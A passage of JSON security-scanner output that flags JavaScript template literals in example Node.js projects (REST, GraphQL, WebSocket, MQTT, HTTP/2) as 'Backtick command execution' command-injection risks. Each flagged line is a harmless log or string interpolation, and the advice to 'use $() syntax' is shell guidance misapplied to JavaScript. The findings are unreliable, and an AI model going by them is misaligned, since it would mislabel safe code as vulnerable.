        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 191,
        "issue": "Backtick command execution",
        "evidence": "if (sort) queryParams += `&sort=${sort}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 194,
        "issue": "Backtick command execution",
        "evidence": "self: `${baseUrl}?${queryParams}&offset=${offset}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 195,
        "issue": "Backtick command execution",
        "evidence": "first: `${baseUrl}?${queryParams}&offset=0`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 196,
        "issue": "Backtick command execution",
        "evidence": "last: `${baseUrl}?${queryParams}&offset=${Math.max(0, total - limit)}`",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 200,
        "issue": "Backtick command execution",
        "evidence": "links.prev = `${baseUrl}?${queryParams}&offset=${Math.max(0, offset - limit)}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 204,
        "issue": "Backtick command execution",
        "evidence": "links.next = `${baseUrl}?${queryParams}&offset=${offset + limit}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 236,
        "issue": "Backtick command execution",
        "evidence": "message: `User with id ${userId} not found`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 242,
        "issue": "Backtick command execution",
        "evidence": "const etag = `\"${new Date(user.updated_at).getTime()}\"`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 267,
        "issue": "Backtick command execution",
        "evidence": "message: `User with email ${email} already exists`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 286,
        "issue": "Backtick command execution",
        "evidence": ".set('Location', `/api/users/${newUser.id}`)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 305,
        "issue": "Backtick command execution",
        "evidence": "message: `User with id ${userId} not found`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 334,
        "issue": "Backtick command execution",
        "evidence": "message: `User with id ${userId} not found`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 360,
        "issue": "Backtick command execution",
        "evidence": "message: `User with id ${userId} not found`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 381,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Server running on port ${PORT}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 382,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Health check: http://localhost:${PORT}/health`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/node/express_rest.js",
        "line_number": 383,
        "issue": "Backtick command execution",
        "evidence": "console.log(`API: http://localhost:${PORT}/api/users`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 119,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Warming up with ${this.options.warmup} requests...`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 126,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Running ${this.options.iterations} iterations with concurrency ${this.options.concurrent}...`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 193,
        "issue": "Backtick command execution",
        "evidence": "reject(new Error(`HTTP ${res.statusCode}: ${data}`));",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 200,
        "issue": "Backtick command execution",
        "evidence": "reject(new Error(`GraphQL errors: ${JSON.stringify(json.errors)}`));",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 206,
        "issue": "Backtick command execution",
        "evidence": "reject(new Error(`JSON parse error: ${error.message}`));",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 241,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Total: ${stats.totalRequests}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 242,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Successful: ${stats.successfulRequests}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 243,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Failed: ${stats.failedRequests}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 244,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Success Rate: ${stats.successRate.toFixed(2)}%`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 249,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Min: ${stats.timings.min.toFixed(2)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 250,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Max: ${stats.timings.max.toFixed(2)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 251,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Avg: ${stats.timings.avg.toFixed(2)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 252,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  P50: ${stats.timings.p50.toFixed(2)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 253,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  P90: ${stats.timings.p90.toFixed(2)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 254,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  P95: ${stats.timings.p95.toFixed(2)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 255,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  P99: ${stats.timings.p99.toFixed(2)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 260,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Requests/sec: ${stats.throughput.requestsPerSecond.toFixed(2)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 265,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Avg Query Size: ${stats.sizes.avgQuerySize.toFixed(0)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 266,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Avg Response Size: ${stats.sizes.avgResponseSize.toFixed(0)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 273,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  - ${error}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/scripts/benchmark_queries.js",
        "line_number": 276,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  ... and ${stats.errors.length - 10} more`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/examples/node/dynamodb_trigger.js",
        "line_number": 17,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Error processing record ${record.eventID}:`, error);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/examples/node/dynamodb_trigger.js",
        "line_number": 27,
        "issue": "Backtick command execution",
        "evidence": "message: `Processed ${event.Records.length} records`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/examples/node/dynamodb_trigger.js",
        "line_number": 36,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Processing ${eventName} event from ${tableName}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/examples/node/dynamodb_trigger.js",
        "line_number": 49,
        "issue": "Backtick command execution",
        "evidence": "console.warn(`Unknown event type: ${eventName}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/examples/node/dynamodb_trigger.js",
        "line_number": 64,
        "issue": "Backtick command execution",
        "evidence": "message: `New item created: ${JSON.stringify(item)}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/examples/node/dynamodb_trigger.js",
        "line_number": 84,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Status changed: ${oldItem.status} -> ${newItem.status}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/examples/node/dynamodb_trigger.js",
        "line_number": 88,
        "issue": "Backtick command execution",
        "evidence": "message: `Item ${newItem.id} status: ${oldItem.status} -> ${newItem.status}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
        "line_number": 114,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Client ${ws.id} joined room: ${room} (${rooms.get(room).size} members)`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
        "line_number": 143,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Client ${ws.id} left room: ${ws.room}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
        "line_number": 189,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Message in room ${ws.room}: ${data.content} (sent to ${sent} clients)`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
        "line_number": 207,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Broadcast: ${data.content} (sent to ${sent} clients)`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
        "line_number": 241,
        "issue": "Backtick command execution",
        "evidence": "ws.userId = `user_${ws.id.slice(0, 8)}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
        "line_number": 248,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Client connected: ${ws.id} (${req.socket.remoteAddress})`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
        "line_number": 289,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Error handling ${msg.type}:`, e);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
        "line_number": 298,
        "issue": "Backtick command execution",
        "evidence": "error: `Unknown message type: ${msg.type}`",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
        "line_number": 312,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Client disconnected: ${ws.id} (code: ${code}, reason: ${reason.toString()})`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
        "line_number": 317,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Client error (${ws.id}):`, error.message);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
        "line_number": 325,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Terminating inactive connection: ${ws.id}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
        "line_number": 361,
        "issue": "Backtick command execution",
        "evidence": "console.log(`WebSocket server running on ws://localhost:${PORT}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
        "line_number": 362,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Health check: http://localhost:${PORT}/health`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-server.js",
        "line_number": 363,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Metrics: http://localhost:${PORT}/metrics`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-client.js",
        "line_number": 53,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Connecting to ${this.url}...`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-client.js",
        "line_number": 103,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Flushing message queue (${this.messageQueue.length} messages)`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-client.js",
        "line_number": 176,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Disconnected: code=${code}, reason=${reason.toString()}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-client.js",
        "line_number": 227,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Reconnecting in ${actualDelay}ms (attempt ${this.reconnectAttempts})`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-client.js",
        "line_number": 274,
        "issue": "Backtick command execution",
        "evidence": "content: `Hello at ${new Date().toISOString()}`",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-client.js",
        "line_number": 281,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[EVENT] Disconnected: ${code} - ${reason}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/realtime/websocket-implementation/resources/examples/node/websocket-client.js",
        "line_number": 285,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[EVENT] Reconnecting (attempt ${attempt}, delay ${delay}ms)`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/examples/node/http2-server.js",
        "line_number": 28,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Request: ${headers[':method']} ${path}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/examples/node/http2-server.js",
        "line_number": 211,
        "issue": "Backtick command execution",
        "evidence": "stream.end(`Content for ${requestPath}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/examples/node/http2-server.js",
        "line_number": 288,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Response for ${path}: ${headers[':status']}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/examples/node/http2-server.js",
        "line_number": 297,
        "issue": "Backtick command execution",
        "evidence": "console.log(`${path} complete (${data.length} bytes)`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/examples/node/http2-server.js",
        "line_number": 321,
        "issue": "Backtick command execution",
        "evidence": "console.log(`${method} ${path}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http2-multiplexing/resources/examples/node/http2-server.js",
        "line_number": 364,
        "issue": "Backtick command execution",
        "evidence": "name: `User ${userId}`",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
        "line_number": 17,
        "issue": "Backtick command execution",
        "evidence": "clientId: options.clientId || `mqtt_client_${Math.random().toString(16).slice(2, 10)}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
        "line_number": 36,
        "issue": "Backtick command execution",
        "evidence": "console.log(`\u2713 Connected to ${this.brokerUrl}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
        "line_number": 37,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Session present: ${connack.sessionPresent}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
        "line_number": 48,
        "issue": "Backtick command execution",
        "evidence": "console.error(`\u2717 Connection error: ${error.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
        "line_number": 69,
        "issue": "Backtick command execution",
        "evidence": "console.log(`\ud83d\udce5 [${topic}] (QoS ${qos}, retain=${retain}): ${message.substring(0, 100)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
        "line_number": 85,
        "issue": "Backtick command execution",
        "evidence": "console.error(`\u2717 Subscribe failed: ${err.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
        "line_number": 88,
        "issue": "Backtick command execution",
        "evidence": "console.log(`\u2713 Subscribed to ${topic} (granted QoS: ${granted[0].qos})`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
        "line_number": 106,
        "issue": "Backtick command execution",
        "evidence": "console.error(`\u2717 Publish failed: ${err.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
        "line_number": 109,
        "issue": "Backtick command execution",
        "evidence": "console.log(`\u2713 Published to ${topic}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/mqtt-messaging/resources/examples/node/mqtt_client.js",
        "line_number": 176,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Handler: ${topic} -> ${payload}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/resources/amqp-rabbitmq/examples/nodejs/consumer_with_retry.js",
        "line_number": 107,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Attempt ${retryCount + 1}/${maxRetries + 1}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/resources/amqp-rabbitmq/examples/nodejs/consumer_with_retry.js",
        "line_number": 130,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Retrying (attempt ${retryCount + 1}/${maxRetries})...`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/resources/amqp-rabbitmq/examples/nodejs/consumer_with_retry.js",
        "line_number": 148,
        "issue": "Backtick command execution",
        "evidence": "console.log(`\\nConsuming from queue: ${this.queueName}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/protocols/http3-quic/resources/examples/cloudflare_worker_http3.js",
        "line_number": 164,
        "issue": "Backtick command execution",
        "evidence": "message: `Event ${i}`",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
        "line_number": 57,
        "issue": "Backtick command execution",
        "evidence": "const node = new ComponentTree(`Component-${i}`, i, 'useState');",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
        "line_number": 81,
        "issue": "Backtick command execution",
        "evidence": "const node = new ComponentTree(`Consumer-${i}`, i, 'context');",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
        "line_number": 112,
        "issue": "Backtick command execution",
        "evidence": "const node = new ComponentTree(`OptConsumer-${i}`, i, 'contextOptimized');",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
        "line_number": 165,
        "issue": "Backtick command execution",
        "evidence": "const node = new ComponentTree(`ZustandComp-${i}`, i, 'zustand');",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
        "line_number": 206,
        "issue": "Backtick command execution",
        "evidence": "const node = new ComponentTree(`JotaiComp-${i}`, i, 'jotai');",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
        "line_number": 283,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Running benchmarks with depth=${config.depth}, updates=${config.updates}...`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
        "line_number": 316,
        "issue": "Backtick command execution",
        "evidence": "const avgTime = `${result.avgTimePerUpdate}ms`.padEnd(15);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
        "line_number": 320,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`${pattern} | ${avgTime} | ${avgRenders} | ${totalRenders}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
        "line_number": 330,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Best: ${best.pattern} (${best.avgRendersPerUpdate} renders/update)`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
        "line_number": 331,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Worst: ${worst.pattern} (${worst.avgRendersPerUpdate} renders/update)`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/benchmark_renders.js",
        "line_number": 332,
        "issue": "Backtick command execution",
